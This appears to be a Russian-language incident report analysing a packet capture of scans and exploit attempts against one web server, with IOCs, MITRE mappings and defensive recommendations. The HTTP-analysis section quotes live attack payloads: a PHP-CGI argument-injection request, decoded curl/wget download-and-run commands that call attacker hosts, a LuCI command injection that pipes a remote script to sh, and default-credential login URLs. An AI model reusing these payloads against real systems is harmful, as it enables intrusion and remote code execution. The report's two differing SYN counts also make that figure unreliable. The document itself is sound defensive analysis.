## Общая информация

- **Дата расследования:** 26.06.2026
    
- **Источник:** Malware Traffic Analysis
    
- **Файл дампа:** `2025-01-04-four-days-of-scans-and-probes-and-web-traffic-hitting-my-web-server.pcap`
    
- **Длительность захвата:** 3 дня 23:59:47
    
- **Всего пакетов:** 191 687
    
- **Жертва:** `203.161.44.208`

## Ход расследования

### Шаг 1: Общая картина

Захват длиной ~4 дня. Сервер под постоянным сканированием. Весь трафик — HTTP, порт 80.

### Шаг 2: Участники трафика

Сотни IP сканируют `203.161.44.208`. Основные атакующие:

- `185.103.103.58` — Multi-CVE (PHPUnit, ThinkPHP, Docker, CVE-2024-4577)
    
- `150.136.222.122` — фаззинг PHP-файлов
    
- `93.113.63.8`, `112.6.214.244` — PHPUnit
    
- `92.255.57.58` — Spring Boot Actuator
    
- `104.234.115.10`, `104.234.115.78` — CGI, админки, конфиги
    
- `95.214.53.211` — Cisco ASA
    
- `64.227.13.116` — SonicOS
    
- `185.224.128.43` — Actuator + конфиги
    
- `31.220.1.88`, `141.98.11.155` — LuCI Command Injection
    
- `45.55.225.121` — веб-шеллы
    

### Шаг 3: Сканирование портов

**MITRE ATT&CK T1046:** 71 476 SYN 

### Шаг 4: DNS-анализ
Атакующие используют доменные имена. Обнаружены подозрительные домены:

- `banthis.su`
    
- `asertdnsresearch.com`
    
- `isavscan.biz`, `isavscan.christmas`, `isavscan.boats`
    
- `drakkarns.com`
    
- `parrotdns.com`

### Шаг 5: HTTP-анализ — обнаруженные атаки

**CVE-2017-9841 (PHPUnit eval-stdin.php)**

Запросы к десяткам путей:

```text
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
... и ещё 20+ путей
```

Пейлоад: `<?php echo(md5("Hello PHPUnit"));` → ответ: `404 Not Found`.

**CVE-2024-4577 (PHP-CGI Argument Injection)**

```text
POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
```

Base64-декодированный пейлоад: `curl http://94.156.177.109/sh || wget http://94.156.177.109/sh -O-`

Ответ: `404 Not Found`.

**Command Injection на OpenWRT/LuCI**

```text
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>%60wget+-O-+http://banthis.su/t|sh;%60)
```

Команда: `wget -O- http://banthis.su/t | sh`. Ответ: `404 Not Found`.

**Попытки входа через дефолтные учётные данные**

```text
/boaform/admin/formLogin?username=admin&psd=admin
/boaform/admin/formLogin?username=ec8&psd=ec8
/boaform/admin/formLogin?username=user&psd=user
/boaform/admin/formLogin?username=adminisp&psd=adminisp
```

**Сканирование Spring Boot Actuator**

```text
/actuator/gateway/routes
/actuator/health
/api/v1/actuator/env
/backend/actuator/env
```

**Docker API**

```text
/containers/json
```

**Сканирование админок**

```text
/admin.php, /admin-post.php, /adminfuns.php7
/admin/index.html, /admin/login.asp
/cgi-bin/login.cgi, /login.jsp, /logon.htm
/+CSCOE+/logon.html
```
**Сканирование конфигов**

```text
/config.json, /config/aws.yml, /config/config.ini, /aws.yml
```

**Сканирование SonicOS**

```text
/api/sonicos/auth, /api/sonicos/tfa
```

**Сканирование веб-шеллов**

```text
/alfanew.php, /alfanew.php7, /alfa-rex.php7
/cache-compat.php, /content.php, /dropdown.php
/cgi-bin/xmrlpc.php, /ajax-actions.php
```

**User-Agent:** `Custom-AsyncHttpClient` и `Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)`

### Шаг 6: HTTPS/TLS

Не обнаружено. Только HTTP.

### Шаг 7: Передача файлов

Вредоносные файлы не скачивались. Эксплойты не отработали.

### Шаг 8-14

SMB, Kerberos, PowerShell — не применимы.

## Индикаторы компрометации (IOC)

### IP-адреса атакующих

`185.103.103.58`, `150.136.222.122`, `93.113.63.8`, `112.6.214.244`, `92.255.57.58`, `104.234.115.10`, `104.234.115.78`, `95.214.53.211`, `64.227.13.116`, `185.224.128.43`, `31.220.1.88`, `45.55.225.121`, `141.98.11.155`, `170.64.218.149`, `139.144.52.241`

### C2-инфраструктура

- `94.156.177.109/sh` — шелл-хостинг
    
- `banthis.su/t` — вредоносный скрипт
    
- `103.149.87.69/t` — вредоносный скрипт
    

### Артефакты

- **User-Agent:** `Custom-AsyncHttpClient`, `GenomeCrawlerd/1.0`
    
- **URL:** `eval-stdin.php`, `/cgi-bin/luci/`, `/actuator/gateway/routes`, `/containers/json`, `/api/sonicos/auth`, `/hello.world`, `/boaform/admin/formLogin`
    
- **Команды:** `wget -O- http://banthis.su/t|sh`, `curl http://94.156.177.109/sh`
    

## MITRE ATT&CK

- T1190 (Exploit Public-Facing Application) — PHPUnit, LuCI, SonicOS, Cisco ASA
    
- T1046 (Network Service Scanning) — 151 684 SYN
    
- T1059.004 (Unix Shell) — Command Injection через LuCI
    
- T1078.001 (Default Accounts) — admin/admin, ec8/ec8, user/user
    
- T1552 (Unsecured Credentials) — сканирование конфигов
    
- T1613 (Container and Resource Discovery) — Docker API
    

## Рекомендации

1. Проверить сервер на наличие `eval-stdin.php` и других веб-шеллов
    
2. Заблокировать IP атакующих на файрволе
    
3. Скрыть версию сервера (`Server: Apache/2.4.62`)
    
4. Включить HTTPS, настроить WAF
    
5. Создать правила SIEM для детекта: `eval-stdin.php`, `/actuator`, Command Injection в URL, `Custom-AsyncHttpClient`
    
6. Проверить исходящий трафик с `203.161.44.208` — SYN-сканирование может означать заражение